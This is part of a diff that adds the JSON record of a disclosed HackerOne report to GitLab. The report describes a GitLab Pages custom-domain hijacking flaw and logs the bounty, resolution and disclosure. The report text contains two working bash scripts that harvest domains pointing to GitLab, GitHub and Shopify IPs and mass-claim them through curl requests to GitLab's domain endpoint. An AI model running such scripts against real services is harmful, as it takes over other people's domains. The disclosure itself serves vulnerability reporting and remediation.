+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High", 
+                "old_severity": null
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2363419, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-02-08T17:50:29.480Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:50:29.480Z", 
+            "actor": {
+                "url": "/gitlab", 
+                "profile": {
+                    "name": "GitLab"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
+                }
+            }, 
+            "team_handle": "gitlab", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "750.0", 
+            "collaborator": {
+                "username": "edoverflow", 
+                "url": "/edoverflow"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2363420, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T17:51:32.993Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:51:32.993Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugReopened", 
+            "id": 2363425, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "edoverflow", 
+                "url": "/edoverflow"
+            }, 
+            "created_at": "2018-02-08T17:51:46.678Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:51:46.678Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2363426, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T17:56:26.486Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T17:56:26.486Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Thank you, @jritchey. I am very impressed by your program and I look forward to reporting more issues in the future.", 
+            "markdown_message": "<p>Thank you, <a href=\"/jritchey\">@jritchey</a>. I am very impressed by your program and I look forward to reporting more issues in the future.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2363430, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T18:01:36.293Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T18:01:36.293Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugReopened", 
+            "id": 2363439, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T18:02:07.306Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T18:02:07.306Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2363441, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T19:03:48.128Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T19:03:48.128Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "To help you with keeping track of affected users, I constructed a list of potentially vulnerable (sub)domains.\n\n```\n$ wc -l vulnerable-gitlab-projects.txt\n1350 vulnerable-gitlab-projects.txt\n```", 
+            "markdown_message": "<p>To help you with keeping track of affected users, I constructed a list of potentially vulnerable (sub)domains.</p>\n<pre class=\"highlight plaintext\"><code>$ wc -l vulnerable-gitlab-projects.txt\n1350 vulnerable-gitlab-projects.txt\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2363608, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T23:13:58.627Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T23:13:58.627Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Thanks @edoverflow !", 
+            "markdown_message": "<p>Thanks <a href=\"/edoverflow\">@edoverflow</a> !</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2364303, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-12T21:10:32.023Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-12T21:10:32.023Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I would like to apologise for contacting affected users without notifying you first. I was hoping to help your customers and in the process help you in resolving this issue. I am terribly sorry, it didn't even cross my mind that affected users could possibly panic and contact support. I promise not to contact any further affected users and instead to submit them here for you to contact.", 
+            "markdown_message": "<p>I would like to apologise for contacting affected users without notifying you first. I was hoping to help your customers and in the process help you in resolving this issue. I am terribly sorry, it didn&#39;t even cross my mind that affected users could possibly panic and contact support. I promise not to contact any further affected users and instead to submit them here for you to contact.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2376739, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-12T23:03:08.887Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-12T23:03:08.887Z", 
+            "actor": {
+                "username": "jritchey", 
+                "url": "/jritchey", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "We understand you have good intentions. If you\u2019re unsure about any actions, please check with us first.", 
+            "markdown_message": "<p>We understand you have good intentions. If you\u2019re unsure about any actions, please check with us first.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2376997, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "edoverflow", 
+                "url": "/edoverflow"
+            }, 
+            "created_at": "2018-02-21T21:39:15.105Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-21T21:39:15.105Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2413440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-21T23:46:09.412Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-21T23:46:09.412Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2413705, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-21T23:46:26.856Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-21T23:46:26.856Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ManuallyDisclosed", 
+            "id": 2413707, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-22T18:11:44.707Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-22T18:11:44.707Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Resolved.", 
+            "markdown_message": "<p>Resolved.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2422289, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "edoverflow", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/edoverflow", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/116/374/2e86e29173a7b27dc4e4c35ecaef804781110b9f_small.png?1527882436"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 65, 
+        "name": "Business Logic Errors"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -22286441.947796352, 
+    "disclosed_at": "2018-02-21T23:46:26.928Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/312118", 
+    "created_at": "2018-02-04T14:25:08.445Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"vulnerability-description\">Vulnerability Description</h1>\n\n<p>There is a logic flaw in how GitLab pages can set custom domains that allows an attacker to actively monitor domains and hijack them as soon as they point to <code>52.167.214.135</code>. GitLab allows setting an unlimited number of domains for a single repository. </p>\n\n<p>First, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.</p>\n<pre class=\"highlight shell\"><code><span class=\"c\">#!/bin/bash</span>\n\n<span class=\"nv\">searches</span><span class=\"o\">=(</span>\n    <span class=\"s2\">&quot;The resource that you are attempting to access does not exist or you don&#39;t have the necessary permissions to view it.&quot;</span>\n<span class=\"o\">)</span>\n\ngron <span class=\"s2\">&quot;https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135&quot;</span> | fgrep <span class=\"s2\">&quot;domain&quot;</span> | grep -o <span class=\"s1\">&#39;&quot;[^&quot;]\\+&quot;&#39;</span> | cut -d <span class=\"s1\">&#39;&quot;&#39;</span> -f 2 &gt; whiteknight-temp\n\n<span class=\"k\">while </span><span class=\"nb\">read </span>domain; <span class=\"k\">do\n    if </span>host <span class=\"s2\">&quot;</span><span class=\"nv\">$domain</span><span class=\"s2\">&quot;</span>&gt; /dev/null; <span class=\"k\">then\n        </span><span class=\"nb\">echo</span> <span class=\"nv\">$domain</span>;\n    <span class=\"k\">fi</span>;\n<span class=\"k\">done</span> &lt; whiteknight-temp &gt;&gt; domains\n\ncat domains | uniq | sed -e <span class=\"s1\">&#39;s/^/https:\\/\\//&#39;</span> &gt;&gt; domains-to-test\n\nmeg / domains-to-test\n\n<span class=\"k\">for </span>str <span class=\"k\">in</span> <span class=\"s2\">&quot;</span><span class=\"k\">${</span><span class=\"nv\">searches</span><span class=\"p\">[@]</span><span class=\"k\">}</span><span class=\"s2\">&quot;</span>; <span class=\"k\">do\n    </span>grep --color -Hnri <span class=\"s2\">&quot;</span><span class=\"nv\">$str</span><span class=\"s2\">&quot;</span> out/\n<span class=\"k\">done\n\nwhile </span><span class=\"nb\">read </span>target; <span class=\"k\">do\n    </span>curl --silent <span class=\"s1\">&#39;https://gitlab.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pages/domains&#39;</span> -H <span class=\"s1\">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span> --compressed -H <span class=\"s1\">&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> -H <span class=\"s1\">&#39;Cache-Control: no-cache&#39;</span> -H <span class=\"s1\">&#39;Connection: keep-alive&#39;</span> -H <span class=\"s1\">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class=\"s1\">&#39;Cookie: _gitlab_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; sidebar_collapsed=false&#39;</span> -H <span class=\"s1\">&#39;DNT: 1&#39;</span> -H <span class=\"s1\">&#39;Host: gitlab.com&#39;</span> -H <span class=\"s1\">&#39;Pragma: no-cache&#39;</span> -H <span class=\"s1\">&#39;Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new&#39;</span> -H <span class=\"s1\">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span class=\"s1\">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0&#39;</span> --data <span class=\"s2\">&quot;utf8=\u2713&amp;authenticity_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;pages_domain[domain]=</span><span class=\"nv\">$target</span><span class=\"s2\">&amp;pages_domain[certificate]&amp;pages_domain[key]&quot;</span>\n<span class=\"k\">done</span> &lt; domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n</code></pre>\n<p>Then I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to <code>52.167.214.135</code>, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.</p>\n<pre class=\"highlight shell\"><code><span class=\"c\">#!/bin/bash</span>\n\n<span class=\"nv\">IPS</span><span class=\"o\">=(</span>\n    <span class=\"c\"># GitLab</span>\n    <span class=\"s2\">&quot;52.167.214.135&quot;</span>\n    <span class=\"c\"># GitHub</span>\n    <span class=\"s2\">&quot;192.30.252.153&quot;</span>\n    <span class=\"s2\">&quot;192.30.252.154&quot;</span>\n    <span class=\"c\"># Shopify</span>\n    <span class=\"s2\">&quot;23.227.38.32&quot;</span>\n<span class=\"o\">)</span>\n\n<span class=\"k\">for </span>ip <span class=\"k\">in</span> <span class=\"s2\">&quot;</span><span class=\"k\">${</span><span class=\"nv\">IPS</span><span class=\"p\">[@]</span><span class=\"k\">}</span><span class=\"s2\">&quot;</span>; <span class=\"k\">do\n    </span>gron <span class=\"s2\">&quot;https://app.securitytrails.com/api/search/by_type/ip/</span><span class=\"nv\">$ip</span><span class=\"s2\">&quot;</span> | fgrep <span class=\"s2\">&quot;domain&quot;</span> | grep -o <span class=\"s1\">&#39;&quot;[^&quot;]\\+&quot;&#39;</span> | cut -d <span class=\"s1\">&#39;&quot;&#39;</span> -f 2 &gt; whiteknight-temp\n<span class=\"k\">done\n\nwhile </span><span class=\"nb\">read </span>domain; <span class=\"k\">do\n    if </span>host <span class=\"s2\">&quot;</span><span class=\"nv\">$domain</span><span class=\"s2\">&quot;</span>&gt; /dev/null; <span class=\"k\">then\n        </span><span class=\"nb\">echo</span> <span class=\"nv\">$domain</span>;\n    <span class=\"k\">fi</span>;\n<span class=\"k\">done</span> &lt; whiteknight-temp &gt;&gt; domains\n\n<span class=\"k\">while </span><span class=\"nb\">read </span>target; <span class=\"k\">do\n    </span>curl --silent <span class=\"s1\">&#39;https://gitlab.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/pages/domains&#39;</span> -H <span class=\"s1\">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span> --compressed -H <span class=\"s1\">&#39;Accept-Language: en-GB,en;q=0.5&#39;</span> -H <span class=\"s1\">&#39;Cache-Control: no-cache&#39;</span> -H <span class=\"s1\">&#39;Connection: keep-alive&#39;</span> -H <span class=\"s1\">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class=\"s1\">&#39;Cookie: _gitlab_session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; sidebar_collapsed=false&#39;</span> -H <span class=\"s1\">&#39;DNT: 1&#39;</span> -H <span class=\"s1\">&#39;Host: gitlab.com&#39;</span> -H <span class=\"s1\">&#39;Pragma: no-cache&#39;</span> -H <span class=\"s1\">&#39;Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new&#39;</span> -H <span class=\"s1\">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span class=\"s1\">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0&#39;</span> --data <span class=\"s2\">&quot;utf8=\u2713&amp;authenticity_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;pages_domain[domain]=</span><span class=\"nv\">$target</span><span class=\"s2\">&amp;pages_domain[certificate]&amp;pages_domain[key]&quot;</span>\n<span class=\"k\">done</span> &lt; domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n</code></pre>\n<p>Please note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use <code>securitytrails.com</code> to demonstrate the issue without affecting your users.</p>\n\n<h1 id=\"proof-of-concept\">Proof of concept</h1>\n\n<p>With my colleague&#39;s permission, I asked them to set an A record for their personal domain (<a title=\"http://danfield.photography/\" href=\"/redirect?signature=66cf843832e21d4ace673ea60deb317b808c441d&amp;url=http%3A%2F%2Fdanfield.photography%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://danfield.photography/</span><i class=\"icon-external-link\"></i></a>) pointing to <code>52.167.214.135</code>. They set the A record <strong>after</strong> I had added their domain to my repository. After a couple of minutes, their domain was serving my repository&#39;s content.</p>\n\n<h1 id=\"mitigation\">Mitigation</h1>\n\n<p>Since this is a logic flaw, there will be multiple ways to mitigate the issue.</p>\n\n<ol>\n<li>You could restrict repositories to only a single custom domain \u2014 this is what GitHub does.</li>\n<li>Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.</li>\n<li>Not store the domain until it actually points to <code>52.167.214.135</code> \u2014 currently you store any domain pointing to various other services and IPs.</li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>GitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://about.gitlab.com", 
+            "about": "Open source software to collaborate on code", 
+            "twitter_handle": "gitlab", 
+            "name": "GitLab"
+        }, 
+        "handle": "gitlab", 
+        "url": "https://hackerone.com/gitlab", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 264, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
